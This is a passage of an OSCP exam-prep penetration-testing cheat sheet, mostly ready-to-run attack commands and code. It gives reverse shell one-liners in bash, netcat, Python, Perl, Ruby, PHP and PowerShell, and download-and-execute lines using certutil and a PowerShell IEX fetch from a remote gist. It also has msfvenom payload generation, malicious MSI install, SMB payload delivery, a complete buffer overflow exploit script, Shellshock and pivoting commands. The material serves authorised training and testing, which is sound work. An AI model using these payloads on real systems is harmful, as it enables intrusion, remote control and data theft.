    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    ```
*   If both are set to `1`, you can generate and run a malicious MSI file.

    ```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 -f msi > install.msi
    ```

    On target:

    ```cmd
    C:> msiexec /quiet /qn /i install.msi
    ```

#### Kernel Exploits

* [abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
* Run `systeminfo`, capture the output, and run `windows-exploit-suggester.py` against it.
*   **Compiling Kernel Exploits (using mingw-w64):**

    ```bash
    # 64-bit
    x86_64-w64-mingw32-gcc exploit.c -o exploit.exe

    # 32-bit
    i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
    ```

#### Automated Enumeration Tools

**Powershell:**

* `powershell -ep bypass`
* `load powershell` (only in meterpreter)
* [Sherlock](https://github.com/rasta-mouse/Sherlock)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

**EXE:**

* [Hacktricks EXE section](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#exe)
* [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
* [Accesschk.exe](https://github.com/jivoi/pentest/blob/master/post_win/accesschk_exe)
* [Seatbelt](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)
* [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

**Metasploit:**

```
getsystem
run post/multi/recon/local_exploit_suggester
```

#### Resources

* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
* [https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) (Win Privesc Checlist)
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)

***

### Reverse Shells & TTY

* [Reverse Shell Cheat Sheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [PayloadsAllTheThings Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

#### Listeners

```bash
# Socat
socat file:`tty`,echo=0,raw tcp-listen:LPORT

# Netcat
nc -lvvp LPORT
```

#### Linux Reverse Shells

**Bash**

```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/LHOST/LPORT && while read line 0<&5; do $line 2>&5 >&5; done
```

**Netcat**

```bash
nc -e /bin/sh LHOST LPORT
/bin/sh | nc LHOST LPORT
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
```

**PHP**

```php
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Python**

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Perl**

```perl
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Ruby**

```ruby
ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Windows Reverse Shells

**Powershell**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae73b7da09e51921a64613c3b28b780/voile')
```

**Certutil**

```cmd
# Download and execute
certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe && shell.exe

# Base64 encoded payload delivery
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```

**Metasploit SMB Delivery**

```
use exploit/windows/smb/smb_delivery
set srvhost 192.168.1.109 //your LHOST
exploit
```

On target machine:

```cmd
rundll32.exe \\192.168.1.109\vabFG\test.dll,0
```

#### Spawning a TTY Shell

**Python**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Socat**

*   On attacker machine:

    ```bash
    socat file:`tty`,raw,echo=0 tcp-listen:4444
    ```
*   On victim machine:

    ```bash
    socat exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:<attacker_port>
    ```

**Script**

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

#### Upgrading to a Fully Interactive TTY

1.  Background the remote shell with `CTRL-Z`.

    ```
    user@remote:~$ ^Z
    ```
2.  On your local machine, get terminal dimensions.

    ```bash
    user@local:~$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; //g'
    rows 50 cols 180
    ```
3.  Set local shell to raw mode and foreground the remote shell.

    ```bash
    user@local:~$ stty raw -echo; fg
    ```
4.  Once back in the remote shell, set the correct size.

    ```bash
    user@remote:~$ stty rows 50 cols 180
    ```
5.  Set terminal type for colors.

    ```bash
    user@remote:~$ export TERM=xterm-256color
    ```
6.  Reload bash.

    ```bash
    user@remote:~$ exec /bin/bash
    ```

#### Restricted Shell / SSH Bypass

* If reverse shell is not working, try port `443` or `80`.
* Check for bad characters breaking the shell.
*   **Ways to get a non-profile shell:**

    ```bash
    ssh hostname -t "bash --noprofile"
    ssh -t user@host bash --norc --noprofile
    ssh -t username@hostname /bin/sh
    ssh -t user@host "bash --norc --noprofile -c '/bin/rm .bashrc'"
    ```
*   **Shellshock bypass:**

    ```bash
    ssh -i noob noob@192.168.0.119 '() { :; }; uname -a'
    ```
*   **Bypass PATH restrictions:**

    ```bash
    export PATH=/bin/:/sbin/:/usr/bin/:$PATH
    payload = "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
    ```

***

### File Transfers

#### Set up FTP Server (Kali)

```bash
apt-get install python-pyftpdlib
# Don't run from TMUX
python -m pyftpdlib -p 21
```

#### Set up SMB Server (Kali)

```bash
impacket-smbserver tmp .
```

#### Set up HTTP Server (Kali)

```bash
# Python 2
python -m SimpleHTTPServer 80

# Python 3
python3 -m http.server 80

# updog (https://github.com/sc0tfree/updog)
updog
```

#### Linux Client Download

```bash
curl http://<ip>/file -o file
wget http://<ip>/file
```

#### Windows Client Download

```cmd
certutil -urlcache -f http://<ip>/uri output.ext
copy \\10.10.10.x\smb\file.exe .
```

#### Netcat Transfer

**Receiver (Listens)**

```bash
nc -nlvp 4444 > file
```

**Sender**

```bash
nc <receiver_ip> 4444 < file
```

**Base64 Encoded Sender (for binaries)**

```bash
cat binary | base64 | nc <receiver_ip> 4444
# On receiver, pipe to base64 -d
```

***

### Buffer Overflows

#### Steps:

1. Fuzzing (find the crash point)
2. Finding the Offset (control EIP)
3. Overwriting the EIP
4. Finding Bad Characters
5. Finding the JMP ESP address
6. Exploiting the System

#### 1. Fuzzing

```python
#!/usr/bin/python
import sys, socket
buffer = "A" * 3000
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.0.0.71', 9999))
    s.send(('TRUN /.:/' + buffer))
    s.recv(1024)
    s.close()
except:
    print "Error connecting"
    sys.exit()
```

#### 2. Finding the Offset

**Cmd:**

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_VALUE>
```

**Example:** `pattern_offset.rb -q 386F4337` -> `2003`

#### 3. Overwriting the EIP

```python
#!/usr/bin/python
import sys, socket
# Offset of 2003, EIP controlled by 4 B's
shellcode = 'A' * 2003 + 'B' * 4
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.0.0.71', 9999))
    s.send('TRUN /.:/' + shellcode)
    s.close()
except:
    print('Error connecting to server')
    sys.exit()
```

#### 4. Finding the bad Characters

Generate all characters from `\x01` to `\xff`. Send them after the EIP overwrite and observe the memory dump in the debugger to see which ones are missing or mangled. The null byte `\x00` is almost always a bad character.

#### 5. Finding the JMP ESP Instruction Address

Use a tool like `mona.py` in Immunity Debugger.

```
!mona jmp -r esp
```

Alternatively, in Immunity Debugger, right-click -> Search for -> All commands in all modules, and search for `JMP ESP`. Choose an address from a non-ASLR module (e.g., `essfunc.dll`). Remember to write it in little-endian format (e.g., `0x625011af` becomes `\xaf\x11\x50\x62`).

#### 6. Exploiting

**Generate shellcode:**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.82 LPORT=4444 EXITFUNC=thread -f py -a x86 -b "\x00"
```

**Final exploit script:**

```python
#!/usr/bin/python
import sys, socket

# msfvenom shellcode here
shellcode = ("\xb8\x0c\x65...")

# A's up to offset, JMP ESP address, NOP sled, shellcode
overflow = 'A' * 2003 + "\xaf\x11\x50\x62" + '\x90' * 32 + shellcode

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.0.0.71', 9999))
    s.send('TRUN /.:/' + overflow)
    s.close()
except:
    print('Error connecting to server')
    sys.exit()
```

#### Linux BOF

* **Check ASLR:** `cat /proc/sys/kernel/randomize_va_space`
  * `0`: ASLR Disabled
  * `1` or `2`: ASLR Enabled
* **Check protections:** `gdb checksec <binary>`
* `ldd <binary>`
* `ltrace <binary>`
* **Tools:**
  * [GDB Peda](https://github.com/longld/peda)
  * [one\_gadget](https://github.com/david942j/one_gadget) (for finding RCE in libc)

***

### Misc

#### SSH Permissions

```bash
chmod 700 ~/.ssh
chmod 644 ~/.ssh/authorized_keys
chmod 644 ~/.ssh/known_hosts
chmod 644 ~/.ssh/config
chmod 600 ~/.ssh/id_rsa
chmod 644 ~/.ssh/id_rsa.pub
```

#### Msfvenom Payloads

```bash
msfvenom --list formats
msfvenom --list encoders

# PHP
msfvenom -p php/reverse_php LHOST=192.168.0.110 LPORT=443 > tmp.php

# Linux Elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

#### Cryptography

* **Cipher Identifier:**
  * [https://www.boxentriq.com/code-breaking/cipher-identifier](https://www.boxentriq.com/code-breaking/cipher-identifier)
  * [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
* **Hash Identifier (Kali):** `hash-identifier`, `hashid`

#### Pivoting

**Chisel:**

*   **Attacker Machine:**

    ```bash
    ./chisel server -p 8080 --reverse
    ```
*   **Pivot Machine:**

    ```
    chisel.exe client attacker_ip:8080 R:socks
    ```
*   **Proxychains Config (`/etc/proxychains.conf`):**

    ```
    socks5 127.0.0.1 1080
    ```
*   **Scanning through pivot:**

    ```bash
    proxychains nmap 10.10.10.10 -T5 -Pn -sT
    ```

**Pivot via SSH key (Port Forwarding)**

```bash
# Forward local port 9000 to remote web_ip:port through the ssh_ip host
ssh -i root.key -L 9000:web_ip:port user@ssh_ip
# Ex: ssh -i root.key -L9000:10.10.10.75:80 user@10.10.10.73
```

**Pivot via SSH (Dynamic Port Forwarding / SOCKS Proxy)**

```bash
ssh -D 1080 user@pivot_ip
```

* Configure Burp / FoxyProxy to use SOCKS proxy on `127.0.0.1:1080`
* In `/etc/proxychains.conf`, change `socks4` to `socks5` (`127.0.0.1 1080`).

***

### Tips

#### Preparation Tips

* Learn as many techniques as possible so you always have an alternate option.
* "Try harder" doesn't mean trying the same exploit with 200x thread count. It means enumerate harder.

#### Exam Tips

* You have unlimited breaks, use them.
* 24 reverts are plenty.
* The machines are _intentionally_ vulnerable to a _specific_ exploit. Your goal is to find that path. It's often easier than real-world pentesting.
* [ippsec.rocks](http://ippsec.rocks) is a great resource for finding videos on specific services/vulnerabilities.

#### Tip for Enumeration

* Scan all ports using different techniques.
* Brute force web directories with different wordlists and tools.
* Check for file permissions, registry entries, writable folders, privileged processes, and interesting files.
* Look for exploits using `searchsploit` and Google.

#### Tip for Foothold

* Check for password reuse.
* Check for default passwords for applications / CMS.
* If you find LFI, guess file locations based on usernames you've found.
* Usernames found in notes/files can be used for bruteforcing.

***

### Resources & Practice

#### OSCP Journeys and Preparation guides:

* [TJNull's Preparation Guide for PWK/OSCP](https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html)
* [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/)

#### Cheatsheets

* [https://github.com/crsftw/oscp](https://github.com/crsftw/oscp)
* [https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/)
* [http://0xc0ffee.io/blog/OSCP-Goldmine](http://0xc0ffee.io/blog/OSCP-Goldmine)

#### Tools

* **Approved Tools List:** [https://falconspy.medium.com/unofficial-oscp-approved-tools-b2b4e889e707](https://falconspy.medium.com/unofficial-oscp-approved-tools-b2b4e889e707)
* **Enumeration:**
  * [AutoRecon](https://github.com/Tib3rius/AutoRecon)
  * [nmapAutomator](https://github.com/21y4d/nmapAutomator)
* **Note Taking:**
  * [Cherry Tree](https://github.com/giuspen/cherrytree)

#### Practice Arena:

* **HackTheBox:** [https://www.hackthebox.eu](https://www.hackthebox.eu)
* **Vulnhub:** [https://www.vulnhub.com](https://www.vulnhub.com)
* **Practical Pentest Labs:** [https://practicalpentestlabs.com](https://practicalpentestlabs.com)
* **Try Hack Me:** [https://tryhackme.com/](https://tryhackme.com/)
* **OSCP Like VMs (TJNull List):** [Google Sheets Link](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0)
